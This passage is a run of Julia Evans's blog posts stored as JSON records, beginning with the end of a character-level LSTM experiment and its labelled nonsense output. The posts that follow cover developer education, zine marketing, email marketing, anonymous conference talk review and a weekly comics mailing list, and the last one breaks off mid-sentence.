output from the model where I set  temperature = 1  in\nthe prediction function.  It’s kind of like English, which is pretty impressive\ngiven that this model needed to “learn” English from scratch and is totally\nbased on character sequences. \n\n It doesn’t make any  sense , but what did we expect really. \n\n \n “An who was you colotal said that have to have been a little crimantable and\nbeamed home the beetle.  “I shall be in the head of the green for the sound of\nthe wood.  The pastor.  “I child hand through the emperor’s sorthes, where the\nmother was a great deal down the conscious, which are all the gleam of the wood\nthey saw the last great of the emperor’s forments, the house of a large gone\nthere was nothing of the wonded the sound of which she saw in the converse of\nthe beetle.  “I shall know happy to him.  This stories herself and the sound of\nthe young mons feathery in the green safe.” \n\n “That was the pastor.  The some and hand on the water sound of the beauty be\nand home to have been consider and tree and the face.  The some to the\nfroghesses and stringing to the sea, and the yellow was too intention, he was\nnot a warm to the pastor.  The pastor which are the faten to go and the world\nfrom the bell, why really the laborer’s back of most handsome that she was a\ncaperven and the confectioned and thoughts were seated to have great made \n \n\n Here’s some more generated output at  temperature=0.1 , which weights its\ncharacter choices closer to “just pick the highest probability character every\ntime”. This makes the output a lot more repetitive: \n\n \n ole the sound of the beauty of the beetle.  “She was a great emperor of the\nsea, and the sun was so warm to the confectioned the beetle.  “I shall be so\nmany for the beetle.  “I shall be so many for the beetle.  “I shall be so\nstanden for the world, and the sun was so warm to the sea, and the sun was so\nwarm to the sea, and the sound of the world from the bell, where the beetle was\nthe sea, and the sound of the world from the bell, where the beetle was the\nsea, and the sound of the wood flowers and the sound of the wood, and the sound\nof the world from the bell, where the world from the wood, and the sound of the \n \n\n It’s weirdly obsessed with beetles and confectioners, and the sun, and the sea. Seems fine! \n\n that’s all! \n\n my results are nowhere near as good as Karpathy’s so far, maybe due to one of\nthe following: \n\n \n not enough training data \n I got bored with training after an hour and didn’t have the patience to babysit the Colab notebook for longer \n he used a 2-layer LSTM with more hidden parameters than me, I have 1 layer \n something else entirely \n \n\n But I got some vaguely coherent results! Hooray! \n\n"},
{"url": "https://jvns.ca/blog/2018/09/01/who-pays-to-educate-developers-/", "title": "Who pays to educate developers?", "content": "\n     \n\n I’ve been thinking about developer education (and, specifically, education of professional\ndevelopers who have been working for a few years already) for the last year or so. In my last\npost I talked about  how to teach yourself hard things ,\nwhich is how I’ve learned most things. \n\n But! Even when you’re learning on your own, there are all kinds of resources you depend on!  Some\nexamples of places I’ve learned things are: \n\n \n a few really great programming books \n conference talks \n hundreds of blog posts (I subscribe to  dozens of programming blogs ) \n Twitter \n meetups \n Slack groups \n \n\n All of these things (tweets, blog posts, conference talks, etc) take time to make, and a lot of it\nis given away for free. So who pays for all of this work? Here’s a rough taxonomy! If you have more\nto add to it (or examples of people you think are doing great education work that fits into these\ncategories!), I’d love to hear them  on twitter . \n\n companies with a product to sell \n\n One common way to get paid money to teach people about programming is to become a “developer\nadvocate”. I think this is a pretty cool thing! Basically, a lot of companies have realized\nthat a good way to sell tech products is to explain the tech concepts behind their products to people\nin a way that they can actually understand. A great example of this is Google Cloud and Kubernetes\n– a lot of Google developer advocates will write blog posts / give great talks explaining\nKubernetes. And those talks are often really helpful whether or not you end up using Google\nproducts! \n\n But what Google gets out of it is – if more people understand Kubernetes, then as a side effect\nthey also understand Google’s Kubernetes-as-a-service platform, and they’re likely to be more\nexcited about the advantages of using it. \n\n Personally I think this is great – developer advocates are often great programmers and great\nteachers, they get paid to do something that they care about, and they get a lot of free and\nhigh-quality information into the world about various complicated tech things. Awesome! \n\n There are some downsides though, for example Google Cloud developer advocates obviously will focus\non subjects that are somehow related to Google Cloud :) \n\n individual people who get paid in exposure \n\n This is the category most personal blog posts / conference talks fall into. The economics of this\nare – you put together some great blog posts / talks, and maybe folks in your industry now\nrecognize/respect you and are more likely to want to hire you! \n\n My original motivation for starting this blog, 5 years ago, was I wanted to get a better job than\nthe job I’d had before. I posted a lot of my articles to hacker news to try to get readers.\nAnd I think it helped! In any case I do have a way better job now :) \n\n Obviously those aren’t still my motivations – probably the main reason I keep writing here is that\nI find it rewarding when people tell me that my blog posts helped them learned something. But that’s\nnot the only reason! some side effects are: \n\n \n It’s easier for me to get answers to questions I have about tech \n I know it’ll be a little easier for me to get interviews for future jobs, which is reassuring \n giving talks at conferences helped me build a network of folks I can ask questions / learn about\nthe industry from \n \n\n and all that is pretty useful to my career! For example, just last week someone who had read my blog\nemailed me out of the blue about a super interesting job and we had an awesome conversation and I\nlearned something new about the kinds of jobs that exist in computer networking! That would\ndefinitely not have happened if I didn’t blog about what I was learning :) \n\n So blogging / speaking in tech is a long-term investment in your future job opportunities and it can\npay off! \n\n companies who make money through recruiting \n\n I talk about the  Recurse Center  all the time. They don’t produce educational\nmaterials directly, but they’re one of the most interesting places to level up as a developer that I\nknow. It’s free to attend and they make money through recruiting. They’re how I got my current job,\nand the company that hired me paid them 25% of my first year’s salary. I didn’t pay them anything. \n\n (as an aside, I recommend recruiting through RC if you want to hire people who are good at learning\n– you find out more at  https://www.recurse.com/hire) \n\n companies who sell education to developers \n\n The next bucket is companies who sell educational materials to developers directly. \n\n various examples of this that I think are kind of interesting: \n\n \n Linux Weekly News , which offers a $7/month subscription to get the latest\narticles. I really recommend subscribing. It’s great. \n Launch School  has a $200/month class with the aim of getting you a\nway better software job. \n the  School for Poetic Computation , which is a cool school in NYC in the\nintersection of art & tech. it costs $5000 or so for a 10-week class. \n egghead.io , a set of Javascript video tutorials, $40/month \n O’Reilly’s books & videos (like  safari ). \n Lynda ,  Udacity ,  Udemy ,  Coursera  all have online courses \n all the various coding bootcamps \n \n\n individuals who sell education to developers \n\n I’m breaking this out from “companies who sell education to developers” because it seems like these\nbusinesses are differently flavoured. O’Reilly/Lynda/Udacity/Udemy sell information about basically\neverything related to programming. Usually individual people have a much narrower focus, which is\ncool. \n\n \n The Complete Guide to Rails Performance  by Nate Berkopec \n Ruby Tapas , a screencast series by Avdi Grimm \n Michael Lucas’s systems books , many of which he self-publishes \n Destroy All Software  by Gary Bernhardt \n Bubblesort zines , delightful computer science zines by Amy Wibowo \n self-published books like  Writing a compiler in Go  or LOTS of others \n \n\n To me, self publishing definitely falls into this category! In 2018, it seems like a much more viable way to\nactually make money from teaching than traditional publishing. \n\n programming books \n\n I’m going to mostly not talk about programming books for traditional publishers because even though\nthey’re really important, they seem to live in a complicated place between “writing for free for\nexposure” and “making money” that I don’t fully understand. For instance in\n the economics of writing a technical book \nthe author says he made about $23/hour for 500 hours of work. I don’t know if that’s typical. \n\n If people are actually making money at rates better than $20/hour-ish from publishing programming\nbooks with traditional publishers, I’d be curious to know about that! This is not something I know a\nlot about yet. \n\n sell training to companies \n\n Selling training to  companies  is a really logical pattern – an individual might not be willing to\npay $2000 for a class, but a company might very well be willing to pay $2000/person for a 10-person\nin-person class! \n\n here are some examples I know about in that area: \n\n \n Heptio sells Kubernetes training \n Jepsen  offers  distributed systems training , which looks AMAZING \n Sandi Metz  teaches an object-oriented design class \n \n\n There are probably a TON more here that I don’t know about. \n\n should I be paying for more learning materials? \n\n So! Reflecting on this a bit, the categories we’ve seen are: \n\n \n devs who want to learn pay (to invest in their knowledge) \n devs who want to teach pay (to share knowledge / build their network / build a reputation for being an expert) \n companies pay (to educate their employees) \n companies selling a product pay (to educate their future customers) \n \n\n Basically everything that’s free lives in either category #2 or #4, which is most of what I read. Is\nthat really what I want to be doing, though? As much as I ADORE all the bloggers I read I feel like\nit’s kind of weird that I mostly learn from free sources, and the incentive structures there aren’t\nthat well aligned with producing really excellent learning materials. \n\n One of my favourite sources recently to learn from has been the book  the linux programming interface , which is not free (it’s  $70 or so ). And it’s a MUCH more reliable and useful and efficient source than reading Stack Overflow answers about Linux. But not all books\nI’ve bought have been consistently an excellent use of time to read, so I find this a bit tricky. \n\n on writing for free / writing for money \n\n The other reason I’m thinking about this, obviously, is that I  started selling some of my zines  recently, and I’m trying to figure out if I want to change where exactly I fit into this whole ecosystem. I’m pretty comfortable with where I\nam right now (blogging is fun! I get to meet cool people! having writing on the internet that anyone\ncan just read by clicking on a link is great!), so making changes to that is kind of\ninteresting/scary. We’ll see what happens! \n\n"},
{"url": "https://jvns.ca/blog/2019/01/29/marketing-thoughts/", "title": "A few early marketing thoughts", "content": "\n     \n\n At some point last month I said I might write more about business, so here are some very early\nmarketing thoughts for my zine business ( https://wizardzines.com !). The question I’m trying to\nmake some progress on in this post is: “how to do marketing in a way that feels good?” \n\n what’s the point of marketing? \n\n Okay! What’s marketing? What’s the point? I think the ideal way marketing works is: \n\n \n you somehow tell a person about a thing \n you explain somehow why the thing will be useful to them / why it is good \n they buy it and they like the thing because it’s what they expected \n \n\n (or, when you explain it they see that they don’t want it and don’t buy it which is good too!!) \n\n So basically as far as I can tell good marketing is just explaining what the thing is and why it is\ngood in a clear way. \n\n what internet marketing techniques do people use? \n\n I’ve been thinking a bit about internet marketing techniques I see people using on me recently. Here\nare a few examples of internet marketing techniques I’ve seen: \n\n \n word of mouth (“have you seen this cool new thing?!”) \n twitter / instagram marketing (build a twitter/instagram account) \n email marketing (“build a mailing list with a bajillion people on it and sell to them”) \n email marketing (“tell your existing users about features that they already have that they might\nwant to use”) \n social proof marketing (“jane from georgia bought a sweater”), eg fomo.com \n cart notifications (“you left this sweater in your cart??! did you mean to buy it? maybe you\nshould buy it!“) \n content marketing (which is fine but whenever people refer to my writing as ‘content’ I get\ngrumpy :)) \n \n\n you need  some  way to tell people about your stuff \n\n Something that is definitely true about marketing is that you need some way to tell new people about\nthe thing you are doing. So for me when I’m thinking about running a business it’s less about\n“should i do marketing” and more like “well obviously i have to do marketing, how do i do it in a\nway that i feel good about?” \n\n what’s up with email marketing? \n\n I feel like every single piece of internet marketing advice I read says “you need a mailing list”.\nThis is advice that I haven’t really taken to heart – technically I have 2 mailing lists: \n\n \n the RSS feed for this blog, which sends out new blog posts to a mailing list  for folks who don’t\nuse RSS (which 3000 of you get) \n https://wizardzines.com ’s list, for comics / new zine announcements (780 people subscribe to that! thank you!) \n \n\n but definitely neither of them is a Machine For Making Sales and I’ve put in almost no efforts in\nthat direction yet. \n\n here are a few things I’ve noticed about marketing mailing lists: \n\n \n most marketing mailing lists are boring but some marketing mailing lists are actually interesting!\nFor example I kind of like  amy hoy ’s emails. \n Someone told me recently that they have 200,000 people on their mailing list (?!!) which made the\n“a mailing list is a machine for making money” concept make a lot more sense to me. I wonder if\npeople who make a lot of money from their mailing lists all have huge 10k+ person mailing lists\nlike this? \n \n\n what works for me: twitter \n\n Right now for my zines business I’d guess maybe 70% of my sales come from Twitter. The\nmain thing I do is tweet pages from zines I’m working on (for example: yesterday’s  comic about ss ). The comics are usually good and fun so invariably they get tons of\nretweets, which means that I end up with lots of followers, which means that when I later put up the\nzine for sale lots of people will buy it. \n\n And of course people don’t  have  to buy the zines, I post most of what ends up in my zines on\ntwitter for free, so it feels like a nice way to do it. Everybody wins, I think. \n\n (side note: when I started getting tons of new followers from my comics I was actually super worried\nthat it would make my experience of Twitter way worse. That hasn’t happened! the new followers all\nseem totally reasonable and I still get a lot of really interesting twitter replies which is\nwonderful ❤) \n\n I don’t try to hack/optimize this really: I just post comics when I make them and I try to make them\ngood. \n\n a small Twitter innovation: putting my website on the comics \n\n Here’s one small marketing change that I made that I think makes sense! \n\n In the past, I didn’t put anything about how to buy my\ncomics on the comics I posted on Twitter, just my Twitter username. Like this: \n\n \n \n \n\n After a while, I realized people were asking me all the time “hey, can I buy a book/collection?\nwhere do these come from? how do I get more?“! I think a marketing secret is “people actually want\nto buy things that are good, it is useful to tell people where they can buy things that are good”. \n\n So just recently I’ve started adding my website and a note about my current project on the comics I\npost on Twitter. It doesn’t say much: just “❤ these comics? buy a collection! wizardzines.com” and\n“page 11 of my upcoming bite size networking zine”. Here’s what it looks like: \n\n \n \n \n\n I feel like this strikes a pretty good balance between “julia you need to tell people what you’re\ndoing otherwise how are they supposed to buy things from you” and “omg too many sales pitches\neverywhere”? I’ve only started doing this recently so we’ll see how it goes. \n\n should I work on a mailing list? \n\n It seems like the same thing that works on twitter would work by email if I wanted to put in the\ntime (email people comics! when a zine comes out, email them about the zine and they can buy it if\nthey want!). \n\n One thing I LOVE about Twitter though is that people always reply to the comics I post with their\nown tips and tricks that they love and I often learn something new. I feel like email would be\nnowhere near as fun :) \n\n But I still think this is a pretty good idea: keeping up with twitter can be time consuming and I\nbet a lot of people would like to get occasional email with programming drawings. (would you?) \n\n One thing I’m not sure about is – a lot of marketing mailing lists seem to use somewhat aggressive\ntechniques to get new emails (a lot of popups on a website, or adding everyone who signs up to their\nservice / buys a thing to a marketing list) and while I’m basically fine with that (unsubscribing is\neasy!), I’m not sure that it’s what I’d want to do, and maybe less aggressive techniques will work\njust as well? We’ll see. \n\n should I track conversion rates? \n\n A piece of marketing advice I assume people give a lot is “be data driven, figure out what things\nconvert the best, etc”. I don’t do this almost at all – gumroad used to tell me that most of my\nsales came from Twitter which was good to know, but right now I have basically no idea how it works. \n\n Doing a bunch of work to track conversion rates feels bad to me: it seems like it would be\nreally easy to go down a dumb rabbit hole of “oh, let’s try to increase conversion by 5%” instead of\njust focusing on making really good and cool things. \n\n My guess is that what will work best for me for a while is to have some data that tells me in broad\nstrokes how the business works (like “about 70% of sales come from twitter”) and just leave it at\nthat. \n\n should I do advertising? \n\n I had a conversation with Kamal about this post that went: \n\n \n julia: “hmm, maybe I should talk about ads?” \n julia: “wait, are ads marketing?” \n kamal: “yes ads are marketing” \n \n\n So, ads! I don’t know anything about advertising except that you can advertise on Facebook or\nTwitter or Google. Some non-ethical questions I have about advertising: \n\n \n how do you choose what keywords to advertise on? \n are there actually cheap keywords, like is ‘file descriptors’ cheap? \n how much do you need to pay per click? (for some weird linux keywords, google estimated 20 cents\na click?) \n can you use ads effectively for something that costs $10? \n \n\n This seems nontrivial to learn about and I don’t think I’m going to try soon. \n\n other marketing things \n\n a few other things I’ve thought about: \n\n \n I learned about “social proof marketing” sites like fomo.com yesterday which makes popups on your\nsite like “someone bought COOL THING 3 hours ago”. This seems like it has some utility (people are\nactually buying things from me all the time, maybe that’s useful to share somehow?) but those\npopups feel a bit cheap to me and I don’t really think it’s something I’d want to do right now. \n similarly a lot of sites like to inject these popups like “HELLO PLEASE SIGN UP FOR OUR MAILING\nLIST”. similar thoughts. I’ve been putting an email signup link in the footer which seems like a\ngood balance between discoverable and annoying. As an example of a popup which isn’t too\nintrusive, though: nate berkopec has  one on his site  which feels really\nreasonable! (scroll to the bottom to see it) \n \n\n Maybe marketing is all about “make your things discoverable without being annoying”? :) \n\n that’s all! \n\n Hopefully some of this was interesting! Obviously the most important thing in all of this is to make\ncool things that are useful to people, but I think cool useful writing does not actually sell\nitself! \n\n If you have thoughts about what kinds of marketing have worked well for you / you’ve felt good about\nI would love to hear them! \n\n"},
{"url": "https://jvns.ca/blog/2020/10/28/a-few-things-i-ve-learned-about-email-marketing/", "title": "A few things I've learned about email marketing", "content": "\n     \n\n Hello! I’ve been learning a lot about business over the last few years (it’s\npossible to make a living by helping people learn! it’s amazing!). One of the\nthings I’ve found hardest to get my head around was email marketing. \n\n Like a lot of people, I get a lot of unwanted email, and at first I was\nreally opposed to doing any kind of email marketing because I was worried I’d\nbe the  source  of that unwanted email. But I’ve learned how to do it in a way\nthat feels good to me, and where the replies to my marketing emails are usually\nalong the lines of “wow, I love this, thank you so much!”. ( literally: here\nare excerpts from the last 20 or so replies I’ve\ngotten ) \n\n I’m going to structure this as a series of beliefs I had about email marketing\nthat turned out not to be universally true. \n\n myth 1: selling things is an adversarial relationship \n\n I used to think that selling things was a sort of adversarial relationship: the\nperson selling the product wants to convince the buyer (by any means necessary)\nto spend as much money as possible, and that people buying things are usually\nkind of resentful of anyone asking them to spend money. \n\n I’ve learned that actually a lot of people are happy (or even actively\n want ) to spend money on something that will help them solve a problem they\nhave. \n\n Here’s a silly example of something illustrating this: 2 years ago, we’d hired\nsomeone to paint our new apartment. We decided to paint a lot of the walls\nwhite, and we were stuck with the impossible problem of deciding which of the\n10 billion possible shades of white to paint the walls. I found a $27 ebook\ncalled  white is\ncomplicated , and (long\nstory short, this blog post is not about painting) it really helped me\nconfidently choose a shade of white!! We spent thousands of dollars on\npainting, so $30 was a really good investment in making sure we’d be happy with\nthe result. \n\n So even though $27 for an ebook on how to choose a white seems silly at first,\nI was really happy to spend the money, and my guess is a lot of other people\nwho bought that ebook are as well. \n\n The bigger idea here is that it’s easier to run a business when you’re selling\nto people who are happy to buy things based on the value they’re getting from\nthe product. In my case, I’ve found that there are lots of programmers who are\nhappy to pay for clear, short, friendly explanations of concepts they need to\nunderstand for their jobs. \n\n a quick note on how I learned these things: 30x500 \n\n I originally wrote this blog post about all these things I learned, and it kind\nof read like I figured out all of these things naturally over the course of\nrunning a business. But that’s not how it went at all! I’ve actually found it\nvery hard to debug business problems on my own. A lot of the attitudes I had\nwhen I started out running a business were counterproductive (like thinking of\nselling something as an adversarial process), and I don’t know that many people\nwho run similar businesses who I can get advice from. \n\n I learned how to think about selling things as a non-adversarial process (and\neverything else in this blog post, and a lot more) from\n 30x500 , a business class by Amy Hoy ( her\nwriting is here ) and  Alex\nHillman  that I bought a couple of years ago.\n30x500 is about running a specific kind of business (very briefly: sell to\npeople who buy based on value, decide what to build by researching your\naudience, market by teaching people helpful things), which happens to be the\nexact kind of business that I run. It’s been a really great way to learn how to\nrun my business better. \n\n Okay, back to my misconceptions about email marketing! \n\n myth 2: sending email is inherently bad \n\n The next thing I believed was that sending email from a business was somehow\ninherently bad and that all marketing email was unwanted. \n\n I now realize this is untrue even for normal marketing emails – for example,\nlots of people subscribe to marketing newsletters for brands they like because\nthey want to hear about new products when they come out & sales. \n\n But marketing emails aren’t just “not inherently bad”, they can actually be\nreally useful! \n\n marketing is about building trust \n\n When I started sending out business emails, I based them on the emails I was\nused to receiving – I’d announce new zines I’d written, and explain why the\nzine was useful. \n\n But what I’ve learned is that (at least for me) marketing isn’t about\ndescribing your product to the audience,  marketing is about building trust by\nhelping people . \n\n So, instead of just periodically emailing out “hey, here’s a new zine, here’s\nwhy it’s good”, my main marketing email list is called  saturday\ncomics , and it sends you 1 email a\nweek with a programming comic. \n\n What I like about this approach to marketing (“just help people learn things\nfor free”) is that it’s literally just what I love doing anyway – I wrote this\nblog to help people learn things for free for years just because I think it’s\nfun to help people learn. \n\n And people love the Saturday Comics! And it makes money – I announce new zines\nto that list as well, and lots of people buy them. It’s really simple and nice! \n\n myth 3: you have to trick people into signing up for your email marketing list \n\n One pattern I see a lot is that I sign up for some free service, and then I\nstart getting deluged with marketing emails trying to convince me to upgrade to\nthe paid tier or whatever. I used to think that this was how marketing emails\n had  to work – you somehow get people’s email and then send them email, and\nhope that for some reason (???) they decide to buy things from you. \n\n But, of course, this isn’t true! If your marketing list is actually just full\nof genuinely helpful emails, and you can describe who it’s intended for clearly\n(give people a link to the archive to see if they like what they see!), then a\nlot of people will be happy to sign up and receive the emails! \n\n If you clearly communicate who your mailing list will help, then people can\neasily filter themselves in, and the only people on the list will be happy to\nbe on the list. And then you don’t have to send any unwanted email at all!\nHooray! \n\n Here’s one story that influenced how I think about this: once I sent an email\nto everyone who had bought a past zine saying “hey, I just released this other\nzine, maybe you want to buy it!”. And I got an angry reply from someone saying\nsomething like “why are you emailing me, I just bought that one thing from you,\nI don’t want you to keep emailing me about other things”. I decided that I\nagreed with that, and now I’m more careful about being clear about what kinds\nof emails people are opting into. \n\n marketing is about communicating clearly & honestly \n\n One insight (from Alex Hillman) that helped\nme a lot recently was – when someone is dissatisfied with something they\nbought, it doesn’t always mean that the product is “bad”. Maybe the product is\nhelpful to many other people! \n\n But it definitely means that the person’s expectations weren’t met. A tiny\nexample: one of the few refund requests I’ve gotten for a zine was from someone\nfrom who expected there to be more information about sed in the zine, and they\nwere disappointed there was only 1 page about sed. \n\n So if I communicate clearly & accurately what problems a product solves, who\nit’s for, and how it solves those problems, people are much more likely to be\ndelighted when they buy it and be happy to buy from me again in the future!.\nFor my zines specifically, I like to make the table of contents very easy to\nfind so that people can see that there’s  1 page about\nsed   :) \n\n myth 4: you have to constantly produce new emails \n\n I’ve tried and failed to start a lot of mailing lists. the pattern I kept\ngetting stuck in was: \n\n I have an idea for a weekly mailing list I send 2 emails I give up forever \n\n This was partly because I thought that to have a weekly/biweekly mailing list,\nyou have to write new emails every week. And some people definitely do mailing\nlists this way, like  Austin Kleon . \n\n But I learned that there’s a different way to write a mailing list! Instead,\nyou: \n\n put together a list of your best articles / comics / whatever when someone\nsubscribes to that list, send them 1 email a week (or every 2 weeks, or\nwhatever) with one article from the List Of Your Best Articles \n\n The point is most people in the world probably haven’t already read your best\narticles, and so if you just send them one article a week from that list, it’ll\nprobably actually be MORE helpful to them than if you were writing a new\narticle every week. And you don’t need to write any emails every week! \n\n I think this is called a “drip marketing campaign”, but when I search for that\nterm I don’t find the results super helpful – there’s a lot out there about\ntools to do this, but as with anything I think the actual content of the emails\nis the most important thing. \n\n myth 5: unsubscribes are the end of the world \n\n Another email marketing thing I used to get stressed out about was\nunsubscribes. It always feels a little sad to send an email about something I’m\nexcited about and see 20 people unsubscribe immediately, even if it’s only 0.3%\nof people on the mailing list. \n\n But I know that I subscribe to mailing lists very liberally, even on topics\nthat I’m not that interested in, and 70% of the time I decide that I’m not that\ninterested in the topic and unsubscribe eventually. A small percentage of\npeople unsubscribing really just isn’t that big of a deal. \n\n myth 6: you need to optimize your open rates \n\n There are all kinds of analytics you can do with email marketing, like open\nrates. I love numbers and analyzing things, but so far I really haven’t found\ntrying to A/B test or optimize my numbers to be that productive or healthy. I’d\nrather spend my energy on just writing more helpful things for people to read. \n\n The most important thing I’ve learned about website analytics is that it’s\nunproductive to look at random statistics like “the open rate on this email is\n43% but the last one was 47%” and wonder what they mean. What  has  been\nhelpful has been coming up with a few specific questions that are important to\nme (“are people visiting this page from links on other sites, or only from my\nlinks?”) and keeping very rough track of the answers over time. \n\n So far I’ve really never used any of the tracking features of my email\nmarketing software. The only thing I’ve done that I’ve found helpful is:\nsometimes when I release a new zine I’ll send out a discount code to people on\nthe list, and I can tell if people bought the thing from the mailing list\nbecause they used the discount code. \n\n it’s important to remember there are people on the other side \n\n The last thing that’s helped me is to remember that even though emailing\nthousands of people sometimes feels like a weird anonymous thing, there are a\nlot of very delightful people on the other side! So when I write emails, I\nusually try to imagine that I’m writing to some very nice person I met at a\nconference one time who told me that they like my blog. We’re not best friends,\nbut they know my work to some extent, and they’re interested to hear what I\nhave to say. \n\n I often like to remind people why they’re getting the email, especially if I\nhaven’t emailed that list for a long time – “you signed up to get\nannouncements when I release a new zine, so here’s an announcement!”. I think\nthe technical email marketing term for this is a list being “cold” and “warm”,\nlike if you don’t email a list for too long it’s “cold” and your subscribers\nmight have forgotten that they’re on it. \n\n that’s all! \n\n When I started, I was really convinced that email marketing was this terrible,\nawful thing that I could not do that mostly involved tricking people into\ngetting emails they don’t want (ok, I’m exaggerating a bit, but I really\nstruggled with it). But it’s possible to do it in a transparent way where I’m\nmostly just sending people helpful emails that they do want! \n\n The big surprise for me was that email marketing is not a monolithic thing. I\nhave a lot of choices about how to do it, and if I don’t like the way someone\nelse does email marketing, I can just make different choices when doing it\nmyself! \n\n"},
{"url": "https://jvns.ca/blog/2014/05/28/anonymous-talk-submission-equals-amazing/", "title": "Anonymous talk review is amazing.", "content": "\n      Coming down from  !!Con , there are a lot of\nthings I want to talk about. One of the things that surprised and\ndelighted me the most was how well anonymous talk review worked. I\nwould like to tell you about this and how we structured our talk\nreview generally. \n\n We decided to review all the talks anonymously, to try to reduce our\nbias. This was a  ton  of work.\n Alex Clemmer  personally anonymized all the\ntalk proposals and then sat out of the review process because he knew\nthe identities of the proposers. He did an amazing job (including\nwatching attached videos and summarizing them for the reviewers!). \n\n I was honestly a bit scared by this – how were we going to make sure\npeople were good at public speaking if we didn’t even know who they\n were ?! But it turned out my fears were totally unfounded. We ended\nup with \n\n \n a diverse range of talks (about art! compilers! type theory! assembly! games!) \n by a good mix of experienced and new speakers \n which were very well presented. The quality was even higher than I\nexpected, and I’d worked on reviewing the proposals! \n \n\n \n\n Several people told us that they liked the anonymous review because\nthey were confident they’d be judged fairly on the merits of their\nproposal. \n\n One of our accepted speakers,\n Katherine Ye , told us: \n\n \n Thank you so much for [anonymizing everything]! It’s a relief to\nknow that I wasn’t picked for gender, race, age, or anything like\nthat. \n \n\n I would happily do anonymous review again. It was great. \n\n Outreach to women. \n\n This is going to be a whole separate post, since we worked really hard\non this. Basically: about 30-40% of our talk submissions were from\nwomen, and 40% of the talks we accepted were by women. We didn’t\nmeasure other axes of diversity (like race/class/other things).\nThere’s a lot of room for improvement. \n\n 168 proposals!!! \n\n We were blown away by how many people submitted talks. And we only had\nspace for 24 talks! We had to make super hard decisions, and we didn’t\nhave much time. \n\n Talk review: Letter grades \n\n Lindsey  suggested\n this way of managing review \nafter having seen it at academic conferences. Each of us assigned a\nproposal a letter grade (A-D), from “I will fight for this talk”, to\n“I will fight for this talk to be  rejected ”. We then looked at the\nhighest & lowest grade for each talk and binned them into AA, AB, AC,\nAD, BB, BC, BD, CC, CD, DD. We rejected any talk that didn’t have an\nA. \n\n If I knew who a proposal was by, I abstained from reviewing it (so\nhard!). \n\n This left us with maybe 80 talks that at least one person thought was\nexcellent-sounding. Still too many! \n\n GitHub issues for discussion \n\n We then used GitHub to discuss talk proposals. We put each talk into\nan GitHub issue, and tagged them. Here are the tags we used. \n\n \n AA  -  AD  Letter grade ranking \n accept  - Accepted \n reject  - Rejected \n has-advocate  - Someone has advocated this talk in the comments \n reject-advocate  - Someone has argued for rejecting this talk in\nthe comments \n a category: (work/fun/science/product/art/proglang/other) \n \n\n To be accepted, a talk needed an  advocate  – someone who would argue\nfor it to be accepted. Once it had an advocate, we would discuss its\nmerits in a video chat and decide whether to accept or reject it. \n\n We did that, and after much sadness (what do you mean this is still\ntoo many talks! We can’t accept three talks about the Curry-Howard\nisomorphism!), we had a program!. \n\n Super-personal responses \n\n Alex, our Chief Anonymizer, did not only do an amazing job of\nanonymizing! Not at all. We got a ton of submissions that we would\nhave  loved  to accept if we’d had more space. \n\n So Alex sent personal emails to people whose talks we rejected saying\nhow interesting he thought their talks were and which parts\nspecifically he liked. \n\n If your talk got rejected, you should consider submitting it to\nanother conference! We probably loved it. \n\n Amazing results \n\n My favorite things about anonymous talk review were \n\n \n it gave the speakers more confidence that they’d be judged fairly \n it was impossible to accept less-interesting-sounding talks just\nbecause they were “by someone famous”. There were amazing talks by\npeople who had never spoken at a conference before. \n it was impossible to give preferential treatment to our friends!\nThis was a bit sad (some of my friends submitted talks that I knew\nwere great, and were rejected, and I couldn’t do anything), but it\nmade the conference better. \n \n\n Here’s the  final program . There\nwas weaving! Assembly! How serial protocols work! Logic programming!\nHacking poetry! Robots dancing! Python’s 1500-line switch statement!\nAll of the speakers did an amazing job – I think for every single\ntalk I heard someone say “Wow, that was my favorite talk!” \n\n None of this is to say that anonymous review is the best way to do\ntalk review. PyCon does not do anonymous review at all, and I think\nthey do a great job. But it worked very well for us. \n"},
{"url": "https://jvns.ca/blog/2020/07/05/saturday-comics/", "title": "saturday comics: a weekly mailing list of programming comics", "content": "\n     \n\n Hello! This post is about a mailing list ( Saturday\nComics ) that I actually started a\nyear ago. I realized I never wrote about it on this blog, which is maybe\nbetter anyway because now I know more about how it’s gone over the last year! \n\n I think the main idea in this post is probably – if you want to have a mailing\nlist that’s useful to people, but don’t have the discipline to write new email\nall the time, consider just making a mailing list of your best past work! \n\n Let’s start by talking about some of the problems I wanted to solve with this mailing list. \n\n problems I wanted to solve \n\n problem 1: not everyone is on Twitter . \n\n I pretty much exclusively post draft zine pages to Twitter, but not everyone is\non Twitter all the time. Lots of people aren’t on Twitter at all, for lots of\nvery good reasons! So only posting my progress on my zines to Twitter felt\nsilly. \n\n problem 2: weekly mailing lists felt impossible : \n\n I kept hearing “julia, you need a mailing list, mailing lists are the best”. So\nI wanted to set up some kind of “mailing list” or something. Okay! I’ve tried\nto set up a “weekly mailing list” of sorts a few times, and inevitably what\nhappens is: \n\n \n I announce the mailing list \n people subscribe \n I literally never email the list (or email it once, and then never again) \n \n\n For obvious reason, that’s not super effective. \n\n problem 3: it was impossible to find my “best” work : \n\n I have an idea in my head of what my “best” comics are, but there was literally\nno way for anyone else other than me to find that out even though I know that\nsome of my comics are a lot more useful to people than others. \n\n I also recently added  https://wizardzines.com/comics/  as another way to fix\nthis. \n\n send my favourite comics, not the newest comics \n\n Unlike this blog (where people can read my newest work), I decided to use a\ndifferent model: let people see some of my  favourite  comics. \n\n The way I thought about this was – if someone isn’t familiar with my work and\nwants to learn more, they’re more likely to find something interesting to them\nin my “best” work than just whatever I happen to be working on at the time. \n\n solution: saturday comics, an automated weekly mailing list \n\n So! I came up with “saturday comics”. The idea is pretty simple: you get 1\nprogramming comic in your email every Saturday. \n\n Unlike a normal weekly mailing list, though, you don’t get the “latest” email\n– instead, there’s a fixed list of emails in the list, and everyone who signs\nup gets all the emails in the list starting from the beginning. \n\n For example, the first email is called  “bash tricks” , and so if someone signs up\ntoday, they’ll get the “bash tricks” email on Saturday. \n\n so far: 29 weeks of email \n\n So far the list has 29 weeks (7 months) of email – if you sign up today,\nyou’ll get a comic every week for at least 29 weeks. \n\n You might notice that 29 is less than 52 and think “wait, you said this list\nhas existed for a year!“. I haven’t quite kept up with 1 email a week so far.\nWhat happens in practice is that I’ll add 5 new emails, they’ll get sent out over 5\nweeks, then subscribers will stop getting email for while, and then I’ll add\nmore emails eventually and then they’ll start getting email again. \n\n It’s maybe not ideal, but I think it’s okay, and it’s definitely better than my\nprevious mailing list practices of “literally never email the mailing list\never”. \n\n so far: 5000 people have subscribed, and people seem to like it! \n\n 5000 people have subscribed to the list so far, and people seem to like it – I\npretty often get replies saying “hey, thanks for this week’s comic, I loved\nthis one” or see people 